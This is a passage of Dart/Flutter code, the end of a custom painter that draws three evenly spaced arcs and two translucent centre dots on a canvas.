      ..strokeWidth = 2.0
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;
    const startAngles = [0.0, math.pi * 2 / 3, math.pi * 4 / 3];
    for (final start in startAngles) {
      canvas.drawArc(
        Rect.fromCircle(center: center, radius: radius * 0.75),
        start, math.pi / 4, false, arcPaint,
      );
    }

    canvas.drawCircle(center, 4, Paint()..color = _C.ice2.withOpacity(0.6));
    canvas.drawCircle(center, 8, Paint()..color = _C.ice2.withOpacity(0.2));
  }
  @override
  bool shouldRepaint(covariant CustomPainter _) => true;
}